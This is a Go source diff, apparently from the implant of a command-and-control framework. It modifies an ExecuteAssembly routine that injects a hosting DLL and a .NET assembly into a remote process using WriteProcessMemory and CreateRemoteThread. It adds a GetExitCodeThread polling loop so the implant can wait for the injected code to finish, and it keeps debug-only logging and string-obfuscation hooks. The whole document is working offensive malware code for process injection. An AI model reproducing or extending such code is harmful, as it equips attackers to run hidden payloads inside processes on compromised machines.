@@ -24,16 +24,14 @@ import (
 	"fmt"
 	"io"
 	"io/ioutil"
-	"math/rand"
+	"log"
 	"os"
 	"os/exec"
 	"runtime"
+	"strings"
 	"syscall"
 	"time"
-	"unsafe"
-
-	// {{if .Debug}}
-	"log"
+	"unsafe" // {{if .Debug}}
 	// {{else}}{{end}}
 )
 
@@ -54,6 +52,7 @@ var (
 	procWriteProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
 	procCreateRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
 	procCreateThread       = kernel32.MustFindProc("CreateThread")
+	procGetExitCodeThread  = kernel32.MustFindProc("GetExitCodeThread")
 
 	ntdllPath       = "C:\\Windows\\System32\\ntdll.dll" // We make this a var so the string obfuscator can refactor it
 	kernel32dllPath = "C:\\Windows\\System32\\kernel32.dll"
@@ -119,6 +118,17 @@ func createRemoteThread(process syscall.Handle, sa *syscall.SecurityAttributes, 
 		return syscall.InvalidHandle, 0, os.NewSyscallError("CreateRemoteThread", e1)
 	}
 	return syscall.Handle(r1), threadID, nil
+}
+
+func getExitCodeThread(threadHandle syscall.Handle) (uint32, error) {
+	var exitCode uint32
+	r1, _, e1 := procGetExitCodeThread.Call(
+		uintptr(threadHandle),
+		uintptr(unsafe.Pointer(&exitCode)))
+	if r1 == 0 {
+		return exitCode, e1
+	}
+	return exitCode, nil
 }
 
 func sysAlloc(size int) (uintptr, error) {
@@ -406,14 +416,29 @@ func ExecuteAssembly(hostingDll, assembly []byte, process, params string, timeou
 	}
 	// CreateRemoteThread(DLL addr + offset, assembly addr)
 	attr := new(syscall.SecurityAttributes)
-	_, _, err = createRemoteThread(handle, attr, 0, uintptr(hostingDllAddr+BobLoaderOffset), uintptr(assemblyAddr), 0)
+	threadHandle, _, err := createRemoteThread(handle, attr, 0, uintptr(hostingDllAddr+BobLoaderOffset), uintptr(assemblyAddr), 0)
 	if err != nil {
 		return "", err
 	}
 	// {{if .Debug}}
-	log.Printf("[*] RemoteThread started, now sleeping %d seconds...\n", timeout)
+	log.Printf("[*] RemoteThread started. Waiting for execution to finish.\n")
 	// {{end}}
-	time.Sleep(time.Duration(rand.Int31n(timeout)) * time.Second)
+	// time.Sleep(time.Duration(rand.Int31n(timeout)) * time.Second)
+	for {
+		code, err := getExitCodeThread(threadHandle)
+		// log.Println(code)
+		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
+			// {{if .Debug}}
+			log.Printf("[-] Error when waiting for remote thread to exit: %s\n", err.Error())
+			// {{end}}
+			return "", err
+		}
+		if code == 259 {
+			time.Sleep(1000 * time.Millisecond)
+		} else {
+			break
+		}
+	}
 	cmd.Process.Kill()
 	go func() {
 		_, errStdout = io.Copy(&stdoutBuf, stdoutIn)
